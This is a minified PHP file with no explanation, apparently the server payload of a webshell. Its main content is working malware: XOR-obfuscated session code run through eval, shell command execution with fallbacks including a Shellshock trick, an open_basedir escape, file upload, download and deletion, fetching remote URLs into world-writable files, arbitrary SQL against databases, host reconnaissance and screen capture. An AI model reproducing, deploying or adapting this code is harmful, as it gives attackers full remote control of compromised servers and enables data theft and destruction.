// FLAG_STR
$a=array();$b=array();function run($g){reDefSystemFunc();$b=&getSession();@session_start();$h=md5(session_id());if(isset($_SESSION[$h])){$b=unserialize((S1MiwYYr(base64Decode($_SESSION[$h],$h),$h)));}@session_write_close();if(canCallGzipDecode()==1&&@isGzipStream($g)){$g=gzdecode($g);}formatParameter($g);if(isset($b["bypass_open_basedir"])&&$b["bypass_open_basedir"]==true){@bypass_open_basedir();}$j=evalFunc();if($b!==null){session_start();$_SESSION[$h]=base64_encode(S1MiwYYr(serialize($b),$h));@session_write_close();}if(canCallGzipEncode()){$j=gzencode($j,6);}return $j;}function S1MiwYYr($k,$l){for($n=0;$n<strlen($k);$n++){$k[$n]=$k[$n]^$l[($n+1)%15];}return $k;}function reDefSystemFunc(){if(!function_exists("file_get_contents")){function file_get_contents($r){$s=@fopen($r,"rb");$t=false;if($s){do{$t.=fgets($s);}while(!feof($s));}fclose($s);return $t;}}if(!function_exists('gzdecode')&&function_existsEx("gzinflate")){function gzdecode($u){return gzinflate(substr($u,10,-8));}}}function&getSession(){global $b;return $b;}function bypass_open_basedir(){@$v=@dirname($_SERVER['SCRIPT_FILENAME']);$x=@scandir($v);$y=false;if($x!=null){foreach($x as $z){if($z!="."&&$z!=".."){if(@is_dir($z)){if(@chdir($z)===true){$y=true;break;}}}}}if(!@file_exists('bypass_open_basedir')&&!$y){@mkdir('bypass_open_basedir');}if(!$y){@chdir('bypass_open_basedir');}@ini_set('open_basedir','..');@$v=@dirname($_SERVER['SCRIPT_FILENAME']);@$aa=str_replace("\\",'/',$v);@$bb=substr_count($aa,'/')+1;$cc=0;while($cc<$bb){@chdir('..');$cc++;}@ini_set('open_basedir','/');if(!$y){@rmdir($v.'/'.'bypass_open_basedir');}}function formatParameter($g){global $a;$dd=0;$ee=null;while(true){$ff=$g[$dd];if(ord($ff)==0x02){$gg=bytesToInteger(getBytes(substr($g,$dd+1,4)),0);$dd+=4;$hh=substr($g,$dd+1,$gg);$dd+=$gg;$a[$ee]=$hh;$ee=null;}else{$ee.=$ff;}$dd++;if($dd>strlen($g)-1){break;}}}function evalFunc(){try{@session_write_close();$ii=get("codeName");$jj=get("methodName");$b=&getSession();if($jj!=null){if(strlen(trim($ii))>0){if($jj=="includeCode"){return includeCode();}else{if(isset($b[$ii])){return eval($b[$ii]);}else{return"{$ii} no load";}}}else{if(function_exists($jj)){return $jj();}else{return"function {$jj} not exist";}}}else{return "methodName Is Null";}}catch(Exception $kk){return "ERROR://".$kk->getMessage();}}function deleteDir($ll){$mm=@dir($ll);while(@$s=$mm->read()){$nn=$ll."/".$s;@chmod($nn,0777);if((is_dir($nn))&&($s!=".")&&($s!="..")){deleteDir($nn);@rmdir($nn);}else if(is_file($nn)&&($s!=".")&&($s!="..")){@unlink($nn);}}$mm->close();@chmod($ll,0777);return@rmdir($ll);}function deleteFile(){$oo=get("fileName");if(is_dir($oo)){return deleteDir($oo)?"ok":"fail";}else{return(file_exists($oo)?@unlink($oo)?"ok":"fail":"fail");}}function setFileAttr(){$pp=get("type");$qq=get("attr");$z=get("fileName");$rr="Null";if($pp!=null&&$qq!=null&&$z!=null){if($pp=="fileBasicAttr"){if(@chmod($z,convertFilePermissions($qq))){return "ok";}else{return "fail";}}else if($pp=="fileTimeAttr"){if(@touch($z,$qq)){return "ok";}else{return "fail";}}else{return "no ExcuteType";}}else{$rr="type or attr or fileName is null";}return $rr;}function fileRemoteDown(){$ss=get("url");$tt=get("saveFile");if($ss!=null&&$tt!=null){$u=@file_get_contents($ss);if($u!==false){if(@file_put_contents($tt,$u)!==false){@chmod($tt,0777);return "ok";}else{return "write fail";}}else{return "read fail";}}else{return "url or saveFile is null";}}function copyFile(){$uu=get("srcFileName");$vv=get("destFileName");if(@is_file($uu)){if(copy($uu,$vv)){return "ok";}else{return "fail";}}else{return "The target does not exist or is not a file";}}function moveFile(){$uu=get("srcFileName");$vv=get("destFileName");if(rename($uu,$vv)){return "ok";}else{return "fail";}}function getBasicsInfo(){$u=array();$u['OsInfo']=@php_uname();$u['CurrentUser']=@get_current_user();$u['CurrentUser']=strlen(trim($u['CurrentUser']))>0?$u['CurrentUser']:'NULL';$u['REMOTE_ADDR']=@$_SERVER['REMOTE_ADDR'];$u['REMOTE_PORT']=@$_SERVER['REMOTE_PORT'];$u['HTTP_X_FORWARDED_FOR']=@$_SERVER['HTTP_X_FORWARDED_FOR'];$u['HTTP_CLIENT_IP']=@$_SERVER['HTTP_CLIENT_IP'];$u['SERVER_ADDR']=@$_SERVER['SERVER_ADDR'];$u['SERVER_NAME']=@$_SERVER['SERVER_NAME'];$u['SERVER_PORT']=@$_SERVER['SERVER_PORT'];$u['disable_functions']=@ini_get('disable_functions');$u['disable_functions']=strlen(trim($u['disable_functions']))>0?$u['disable_functions']:@get_cfg_var('disable_functions');$u['Open_basedir']=@ini_get('open_basedir');$u['timezone']=@ini_get('date.timezone');$u['encode']=@ini_get('exif.encode_unicode');$u['extension_dir']=@ini_get('extension_dir');$u['sys_get_temp_dir']=@sys_get_temp_dir();$u['include_path']=@ini_get('include_path');$u['DOCUMENT_ROOT']=$_SERVER['DOCUMENT_ROOT'];$u['PHP_SAPI']=PHP_SAPI;$u['PHP_VERSION']=PHP_VERSION;$u['PHP_INT_SIZE']=PHP_INT_SIZE;$u['canCallGzipDecode']=canCallGzipDecode();$u['canCallGzipEncode']=canCallGzipEncode();$u['session_name']=@ini_get("session.name");$u['session_save_path']=@ini_get("session.save_path");$u['session_save_handler']=@ini_get("session.save_handler");$u['session_serialize_handler']=@ini_get("session.serialize_handler");$u['user_ini_filename']=@ini_get("user_ini.filename");$u['memory_limit']=@ini_get('memory_limit');$u['upload_max_filesize']=@ini_get('upload_max_filesize');$u['post_max_size']=@ini_get('post_max_size');$u['max_execution_time']=@ini_get('max_execution_time');$u['max_input_time']=@ini_get('max_input_time');$u['default_socket_timeout']=@ini_get('default_socket_timeout');$u['mygid']=@getmygid();$u['mypid']=@getmypid();$u['SERVER_SOFTWAREypid']=@$_SERVER['SERVER_SOFTWARE'];$u['SERVER_PORT']=@$_SERVER['SERVER_PORT'];$u['loaded_extensions']=@implode(',',@get_loaded_extensions());$u['short_open_tag']=@get_cfg_var('short_open_tag');$u['short_open_tag']=@(int)$u['short_open_tag']==1?'true':'false';$u['asp_tags']=@get_cfg_var('asp_tags');$u['asp_tags']=(int)$u['asp_tags']==1?'true':'false';$u['safe_mode']=@get_cfg_var('safe_mode');$u['safe_mode']=(int)$u['safe_mode']==1?'true':'false';$u['CurrentDir']=str_replace('\\','/',@dirname($_SERVER['SCRIPT_FILENAME']));$ww=@dirname($_SERVER['SCRIPT_FILENAME']);$u['FileRoot']='';if(substr($ww,0,1)!='/'){foreach(range('A','Z')as $xx){if(@is_dir("{$xx}:")){$u['FileRoot'].="{$xx}:/;";}};};$u['FileRoot']=(strlen(trim($u['FileRoot']))>0?$u['FileRoot']:'/');$u['FileRoot']=substr_count($u['FileRoot'],substr($ww,0,1))<=0?substr($ww,0,1).":/":$u['FileRoot'];$j="";foreach($u as $ee=>$hh){$j.=$ee." : ".$hh."\n";}return $j;}function getFile(){$yy=get('dirName');$yy=(strlen(@trim($yy))>0)?trim($yy):str_replace('\\','/',dirname(__FILE__));$yy.="/";$zz=$yy;$x=@scandir($zz);$u="";if($x!=null){$u.="ok";$u.="\n";$u.=$zz;$u.="\n";foreach($x as $z){if($z!="."&&$z!=".."){$aaa=$zz.$z;$bbb=array();array_push($bbb,$z);array_push($bbb,@is_file($aaa)?"1":"0");array_push($bbb,date("Y-m-d H:i:s",@filemtime($aaa)));array_push($bbb,@filesize($aaa));$ccc=(@is_readable($aaa)?"R":"").(@is_writable($aaa)?"W":"").(@is_executable($aaa)?"X":"");array_push($bbb,(strlen($ccc)>0?$ccc:"F"));$u.=(implode("\t",$bbb)."\n");}}}else{return "Path Not Found Or No Permission!";}return $u;}function readFileContent(){$z=get("fileName");if(@is_file($z)){if(@is_readable($z)){return file_get_contents($z);}else{return "No Permission!";}}else{return "File Not Found";}}function uploadFile(){$z=get("fileName");$ddd=get("fileValue");if(@file_put_contents($z,$ddd)!==false){@chmod($z,0777);return "ok";}else{return "fail";}}function newDir(){$yy=get("dirName");if(@mkdir($yy,0777,true)!==false){return "ok";}else{return "fail";}}function newFile(){$z=get("fileName");if(@file_put_contents($z,"")!==false){return "ok";}else{return "fail";}}function function_existsEx($eee){$fff=explode(",",@ini_get("disable_functions"));if(empty($fff)){$fff=array();}else{$fff=array_map('trim',array_map('strtolower',$fff));}return(function_exists($eee)&&is_callable($eee)&&!in_array($eee,$fff));}function execCommand(){@ob_start();$ggg=get("cmdLine");$fff=__FILE__;$ggg=substr($fff,0,1)=="/"?"-c \"{$ggg}\"":"/c \"{$ggg}\"";if(substr($fff,0,1)=="/"){@putenv("PATH=".getenv("PATH").":/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin");}else{@putenv("PATH=".getenv("PATH").";C:/Windows/system32;C:/Windows/SysWOW64;C:/Windows;C:/Windows/System32/WindowsPowerShell/v1.0/;");}$hhh=substr($fff,0,1)=="/"?"sh":"cmd";$ggg="{$hhh} {$ggg}";$ggg=$ggg." 2>&1";$rr=0;if(!function_exists("runshellshock")){function runshellshock($fff,$iii){if(substr($fff,0,1)=="/"&&function_existsEx('putenv')&&(function_existsEx('error_log')||function_existsEx('mail'))){if(strstr(readlink("/bin/sh"),"bash")!=FALSE){$jjj=tempnam(sys_get_temp_dir(),'as');putenv("PHP_LOL=() { x; }; $iii >$jjj 2>&1");if(function_existsEx('error_log')){error_log("a",1);}else{mail("a@127.0.0.1","","","-bv");}}else{return False;}$kkk=@file_get_contents($jjj);@unlink($jjj);if($kkk!=""){print($kkk);return True;}}return False;};}if(function_existsEx('system')){@system($ggg,$rr);}elseif(function_existsEx('passthru')){@passthru($ggg,$rr);}elseif(function_existsEx('shell_exec')){print(@shell_exec($ggg));}elseif(function_existsEx('exec')){@exec($ggg,$lll,$rr);print(join("\n",$lll));}elseif(function_existsEx('popen')){$mmm=@popen($ggg,'r');while(!@feof($mmm)){print(@fgets($mmm,2048));}@pclose($mmm);}elseif(function_existsEx('proc_open')){$ll=@proc_open($ggg,array(1=>array('pipe','w'),2=>array('pipe','w')),$nnn);while(!@feof($nnn[1])){print(@fgets($nnn[1],2048));}while(!@feof($nnn[2])){print(@fgets($nnn[2],2048));}@fclose($nnn[1]);@fclose($nnn[2]);@proc_close($ll);}elseif(runshellshock($fff,$ggg)){print($rr);}elseif(substr($fff,0,1)!="/"&&@class_exists("COM")){$ooo=new COM('WScript.shell');$kk=$ooo->exec($ggg);$ppp=$kk->StdOut();print($ppp->ReadAll());$qqq=$kk->StdErr();print($qqq->ReadAll());}else{return "none of proc_open/passthru/shell_exec/exec/exec/popen/COM/runshellshock is available";}print(($rr!=0)?"ret={$rr}":"");$j=@ob_get_contents();@ob_end_clean();return $j;}function screen(){if(substr(dirname($_SERVER["SCRIPT_FILENAME"]),0,1)!="/"){$rrr=imagegrabscreen();ob_start();imagepng($rrr);$sss=ob_get_contents();ob_end_clean();$ttt=base64_encode($sss);imagedestroy($rrr);return $ttt;}else{return "imagegrabscreen() is only available on Windows.";}}function execSql(){$uuu=get("dbType");$vvv=get("dbHost");$www=get("dbPort");$xxx=get("dbUsername");$yyy=get("dbPassword");$zzz=get("execType");$aaaa=get("execSql");function mysql_exec($bbbb,$cccc,$xxx,$yyy,$zzz,$dddd){$eeee=new mysqli($bbbb,$xxx,$yyy,"",$cccc);if($eeee->connect_error){return $eeee->connect_error;}$j=$eeee->query($dddd);if($eeee->error){return $eeee->error;}$j=$eeee->query($dddd);if($zzz=="update"){return "Query OK, "+$eeee->affected_rows+" rows affected";}else{$u="ok\n";while($ffff=$j->fetch_field()){$u.=base64_encode($ffff->name)."\t";}$u.="\n";if($j->num_rows>0){while($gggg=$j->fetch_assoc()){foreach($gggg as $hh){$u.=base64_encode($hh)."\t";}$u.="\n";}}return $u;}}function pdoExec($hhhh,$bbbb,$cccc,$xxx,$yyy,$zzz,$dddd){try{$eeee=new PDO("{$hhhh}:host=$bbbb;port={$cccc};",$xxx,$yyy);$eeee->setAttribute(PDO::ATTR_ERRMODE,PDO::ERRMODE_EXCEPTION);if($zzz=="update"){return "Query OK, "+$eeee->exec($dddd)+" rows affected";}else{$u="ok\n";$iiii=$eeee->prepare($dddd);$iiii->execute();$gggg=$iiii->fetch(PDO::FETCH_ASSOC);$jjjj="\n";foreach(array_keys($gggg)as $ee){$u.=base64_encode($ee)."\t";$jjjj.=base64_encode($gggg[$ee])."\t";}$u.=$jjjj."\n";while($gggg=$iiii->fetch(PDO::FETCH_ASSOC)){foreach(array_keys($gggg)as $ee){$u.=base64_encode($gggg[$ee])."\t";}$u.="\n";}return $u;}}catch(PDOException $kk){return $kk->getMessage();}}if($uuu=="mysql"){if(extension_loaded("mysqli")){return mysql_exec($vvv,$www,$xxx,$yyy,$zzz,$aaaa);}else if(extension_loaded("pdo")){return pdoExec($uuu,$vvv,$www,$xxx,$yyy,$zzz,$aaaa);}else{return "no extension";}}else if(extension_loaded("pdo")){return pdoExec($uuu,$vvv,$www,$xxx,$yyy,$zzz,$aaaa);}else{return "no extension";}return "no extension";}function base64Encode($u){return base64_encode($u);}function test(){return "ok";}function get($ee){global $a;if(isset($a[$ee])){return $a[$ee];}else{return null;}}function getAllParameters(){global $a;return $a;}function includeCode(){$kkkk=get("binCode");$llll=get("codeName");$b=&getSession();$b[$llll]=$kkkk;return "ok";}function base64Decode($mmmm){return base64_decode($mmmm);}function convertFilePermissions($nnnn){$oooo=0;if(strpos($nnnn,'R')!==false){$oooo=$oooo+0444;}if(strpos($nnnn,'W')!==false){$oooo=$oooo+0222;}if(strpos($nnnn,'X')!==false){$oooo=$oooo+0111;}return $oooo;}function close(){@session_start();$b=&getSession();$b=null;if(@session_destroy()){return "ok";}else{return "fail!";}}function bigFileDownload(){$pppp=get("mode");$z=get("fileName");$qqqq=get("readByteNum");$rrrr=get("position");if($pppp=="fileSize"){if(@is_readable($z)){return@filesize($z)."";}else{return "not read";}}elseif($pppp=="read"){if(function_existsEx("fopen")&&function_existsEx("fread")&&function_existsEx("fseek")){$ssss=fopen($z,"ab+");fseek($ssss,$rrrr);$u=fread($ssss,$qqqq);@fclose($ssss);if($u!==false){return $u;}else{return "cannot read file";}}else if(function_existsEx("file_get_contents")){return file_get_contents($z,false,null,$rrrr,$qqqq);}else{return "no function";}}else{return "no mode";}}function bigFileUpload(){$z=get("fileName");$tttt=get("fileContents");$rrrr=get("position");if(function_existsEx("fopen")&&function_existsEx("fwrite")&&function_existsEx("fseek")){$ssss=fopen($z,"ab+");if($ssss!==false){fseek($ssss,$rrrr);$gg=fwrite($ssss,$tttt);if($gg!==false){return "ok";}else{return "cannot write file";}@fclose($ssss);}else{return "cannot open file";}}else if(function_existsEx("file_put_contents")){if(file_put_contents($z,$tttt,FILE_APPEND)!==false){return "ok";}else{return "writer fail";}}else{return "no function";}}function canCallGzipEncode(){if(function_existsEx("gzencode")){return"1";}else{return"0";}}function canCallGzipDecode(){if(function_existsEx("gzdecode")){return"1";}else{return"0";}}function bytesToInteger($uuuu,$rrrr){$vvvv=0;$vvvv=$uuuu[$rrrr+3]&0xff;$vvvv<<=8;$vvvv|=$uuuu[$rrrr+2]&0xff;$vvvv<<=8;$vvvv|=$uuuu[$rrrr+1]&0xff;$vvvv<<=8;$vvvv|=$uuuu[$rrrr]&0xff;return $vvvv;}function isGzipStream($wwww){if(strlen($wwww)>=2){$wwww=substr($wwww,0,2);$xxxx=@unpack("C2chars",$wwww);$yyyy=intval($xxxx['chars1'].$xxxx['chars2']);switch($yyyy){case 31139:return true;break;default:return false;}}else{return false;}}function getBytes($mmmm){$uuuu=array();for($n=0;$n<strlen($mmmm);$n++){array_push($uuuu,ord($mmmm[$n]));}return $uuuu;}